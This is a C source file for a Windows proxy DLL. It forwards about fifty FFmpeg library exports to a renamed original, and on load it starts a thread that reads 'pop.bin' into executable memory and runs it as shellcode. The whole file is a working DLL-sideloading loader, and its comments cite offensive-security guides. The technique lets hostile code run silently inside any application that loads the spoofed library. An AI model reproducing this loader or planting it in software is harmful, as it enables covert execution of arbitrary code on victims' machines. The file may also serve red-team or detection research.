
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:av_buffer_create=tmp108E.av_buffer_create,@1")
#pragma comment(linker, "/export:av_buffer_get_opaque=tmp108E.av_buffer_get_opaque,@2")
#pragma comment(linker, "/export:av_dict_count=tmp108E.av_dict_count,@3")
#pragma comment(linker, "/export:av_dict_free=tmp108E.av_dict_free,@4")
#pragma comment(linker, "/export:av_dict_get=tmp108E.av_dict_get,@5")
#pragma comment(linker, "/export:av_dict_set=tmp108E.av_dict_set,@6")
#pragma comment(linker, "/export:av_force_cpu_flags=tmp108E.av_force_cpu_flags,@7")
#pragma comment(linker, "/export:av_frame_alloc=tmp108E.av_frame_alloc,@8")
#pragma comment(linker, "/export:av_frame_clone=tmp108E.av_frame_clone,@9")
#pragma comment(linker, "/export:av_frame_free=tmp108E.av_frame_free,@10")
#pragma comment(linker, "/export:av_frame_unref=tmp108E.av_frame_unref,@11")
#pragma comment(linker, "/export:av_free=tmp108E.av_free,@12")
#pragma comment(linker, "/export:av_get_bytes_per_sample=tmp108E.av_get_bytes_per_sample,@13")
#pragma comment(linker, "/export:av_get_cpu_flags=tmp108E.av_get_cpu_flags,@14")
#pragma comment(linker, "/export:av_image_check_size=tmp108E.av_image_check_size,@15")
#pragma comment(linker, "/export:av_init_packet=tmp108E.av_init_packet,@16")
#pragma comment(linker, "/export:av_log_set_level=tmp108E.av_log_set_level,@17")
#pragma comment(linker, "/export:av_malloc=tmp108E.av_malloc,@18")
#pragma comment(linker, "/export:av_max_alloc=tmp108E.av_max_alloc,@19")
#pragma comment(linker, "/export:av_new_packet=tmp108E.av_new_packet,@20")
#pragma comment(linker, "/export:av_packet_alloc=tmp108E.av_packet_alloc,@21")
#pragma comment(linker, "/export:av_packet_copy_props=tmp108E.av_packet_copy_props,@22")
#pragma comment(linker, "/export:av_packet_free=tmp108E.av_packet_free,@23")
#pragma comment(linker, "/export:av_packet_get_side_data=tmp108E.av_packet_get_side_data,@24")
#pragma comment(linker, "/export:av_packet_unref=tmp108E.av_packet_unref,@25")
#pragma comment(linker, "/export:av_rdft_calc=tmp108E.av_rdft_calc,@26")
#pragma comment(linker, "/export:av_rdft_end=tmp108E.av_rdft_end,@27")
#pragma comment(linker, "/export:av_rdft_init=tmp108E.av_rdft_init,@28")
#pragma comment(linker, "/export:av_read_frame=tmp108E.av_read_frame,@29")
#pragma comment(linker, "/export:av_rescale_q=tmp108E.av_rescale_q,@30")
#pragma comment(linker, "/export:av_samples_get_buffer_size=tmp108E.av_samples_get_buffer_size,@31")
#pragma comment(linker, "/export:av_seek_frame=tmp108E.av_seek_frame,@32")
#pragma comment(linker, "/export:av_stream_get_first_dts=tmp108E.av_stream_get_first_dts,@33")
#pragma comment(linker, "/export:av_stream_get_side_data=tmp108E.av_stream_get_side_data,@34")
#pragma comment(linker, "/export:av_strerror=tmp108E.av_strerror,@35")
#pragma comment(linker, "/export:avcodec_align_dimensions=tmp108E.avcodec_align_dimensions,@36")
#pragma comment(linker, "/export:avcodec_alloc_context3=tmp108E.avcodec_alloc_context3,@37")
#pragma comment(linker, "/export:avcodec_descriptor_get=tmp108E.avcodec_descriptor_get,@38")
#pragma comment(linker, "/export:avcodec_descriptor_next=tmp108E.avcodec_descriptor_next,@39")
#pragma comment(linker, "/export:avcodec_find_decoder=tmp108E.avcodec_find_decoder,@40")
#pragma comment(linker, "/export:avcodec_flush_buffers=tmp108E.avcodec_flush_buffers,@41")
#pragma comment(linker, "/export:avcodec_free_context=tmp108E.avcodec_free_context,@42")
#pragma comment(linker, "/export:avcodec_get_name=tmp108E.avcodec_get_name,@43")
#pragma comment(linker, "/export:avcodec_open2=tmp108E.avcodec_open2,@44")
#pragma comment(linker, "/export:avcodec_parameters_to_context=tmp108E.avcodec_parameters_to_context,@45")
#pragma comment(linker, "/export:avcodec_receive_frame=tmp108E.avcodec_receive_frame,@46")
#pragma comment(linker, "/export:avcodec_send_packet=tmp108E.avcodec_send_packet,@47")
#pragma comment(linker, "/export:avformat_alloc_context=tmp108E.avformat_alloc_context,@48")
#pragma comment(linker, "/export:avformat_close_input=tmp108E.avformat_close_input,@49")
#pragma comment(linker, "/export:avformat_find_stream_info=tmp108E.avformat_find_stream_info,@50")
#pragma comment(linker, "/export:avformat_free_context=tmp108E.avformat_free_context,@51")
#pragma comment(linker, "/export:avformat_open_input=tmp108E.avformat_open_input,@52")
#pragma comment(linker, "/export:avio_alloc_context=tmp108E.avio_alloc_context,@53")
#pragma comment(linker, "/export:avio_close=tmp108E.avio_close,@54")


DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer
    FILE* fp;
    size_t size;
    unsigned char* buffer;

    fp = fopen("pop.bin", "rb");
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = (unsigned char*)malloc(size);

    //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
    fread(buffer, size, 1, fp);

    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(exec, buffer, size);

    ((void(*) ())exec)();

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // https://gist.github.com/securitytube/c956348435cc90b8e1f7
                // Create a thread and close the handle as we do not want to use it to wait for it 
        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);

    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



